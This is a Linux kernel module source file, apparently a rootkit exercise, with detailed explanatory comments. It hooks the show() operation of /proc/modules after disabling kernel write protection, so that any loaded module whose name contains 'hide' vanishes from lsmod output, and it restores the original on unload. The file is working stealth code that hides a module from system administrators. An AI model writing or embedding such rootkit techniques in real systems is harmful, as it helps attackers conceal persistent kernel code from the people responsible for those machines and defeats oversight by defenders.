#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/seq_file.h> // struct seq_file
#include <linux/slab.h> //kmalloc()

#include "../implementation/func.h"

#define SECRET_MODULE "hide"

//show()prototype from /include/linux/seq_file.h
//https://elixir.bootlin.com/linux/v4.10/source/kernel/module.c#L4100
int fake_show(struct seq_file *m, void *v);
int (*real_show)(struct seq_file *m, void *v);
void hooking_show(void);

//for hiding the dir in /sys/module
long (*real_getdents)(unsigned int fd, struct linux_dirent __user *dirp, unsigned int count);

int my_init(void) {
    printk("--------------Init hide_module-----------------\n");

    hooking_show();
    return 0;
}

void my_exit(void) {
    struct seq_file* seq_f;
    char *file_path = "/proc/modules";
    struct seq_operations* seq_op;
    // /proc/modules is what system uses to list modules (lsmod)
    struct file* fp= filp_open(file_path, O_RDONLY, 0);
    if (IS_ERR(fp)) {
        printk("file open failed, file path: %s\n", file_path);
        fp = NULL;
        return;
    }
    printk("Opend %s\n", file_path);
    seq_f = fp->private_data;
    seq_op = seq_f->op;
    disable_write_protection();
    seq_op->show = real_show;
    enable_write_protection();
    printk("show() recoved.\n");
    filp_close(fp, NULL);
    printk("--------------Exit hide_module-----------------\n");
    return;
}

void hooking_show(void) {
    struct seq_file* seq_f;
    char *file_path = "/proc/modules";
    struct seq_operations* seq_op;
    //char *file_path = (char *)kmalloc(pid_len + 14, GFP_KERNEL);
    ///proc/modules is what system uses to list modules (lsmod)
    struct file* fp= filp_open(file_path, O_RDONLY, 0);
    if (IS_ERR(fp)) {
        printk("file open failed, file path: %s\n", file_path);
        fp = NULL;
        return;
    }
    printk("Opend %s\n", file_path);
    /*
    The reason we get "private_data" is because, to /proc/modules, 
    struct file's private_data is actually pointing to its struct seq_file.
    We can look at the function of seq_open() from source code here: https://elixir.bootlin.com/linux/v4.10/source/fs/seq_file.c#L61
    int seq_open(struct file *file, const struct seq_operations *op)
    {
        struct seq_file *p;

        WARN_ON(file->private_data);

        p = kzalloc(sizeof(*p), GFP_KERNEL);
        if (!p)
            return -ENOMEM;

        file->private_data = p;

        mutex_init(&p->lock);
        p->op = op;
        ...
    */
    seq_f = fp->private_data;
    seq_op = seq_f->op;
    /*
    We finally reached the show() function. https://elixir.bootlin.com/linux/v4.10/source/include/linux/seq_file.h#L31
        
        ...
        struct seq_operations {
        void * (*start) (struct seq_file *m, loff_t *pos);
        void (*stop) (struct seq_file *m, void *v);
        void * (*next) (struct seq_file *m, void *v, loff_t *pos);
        int (*show) (struct seq_file *m, void *v);
    };
    */
   //save the genuine version first as always
    real_show = seq_op->show;
    printk("Changing seq_op->show from %p to %p\n", real_show, fake_show);
    disable_write_protection();
    seq_op->show = fake_show;
    enable_write_protection();
    return ;
}

int fake_show(struct seq_file *m, void *v) {
    /*
    We inspect every entry in /proc/modules to find is there the module we would like to hide.
    */
    /*
    Every time run real_show(), it will fill one entry into the buffer and increase m->count accordingly. Therefore, we save the count before running, and use the count after running to reduce the count we got before, we then get the size of the entry. This is because every entry's size is different.
    */
    size_t old_count = m->count;
    int ret = real_show(m, v); // we will forward the return value.
    size_t single_entry_size = m->count - old_count;
    if (strnstr(m->buf + m->count - single_entry_size, SECRET_MODULE, single_entry_size)) {
        //our module was found
        printk("Hiding modole %s in /proc/modules\n", SECRET_MODULE);
        //We simply reduce the m->count. This is like moving the cursor backwards so the found entry will be overwritten.
        m->count -= single_entry_size;
    }
    return ret;
}

module_init(my_init);
module_exit(my_exit);
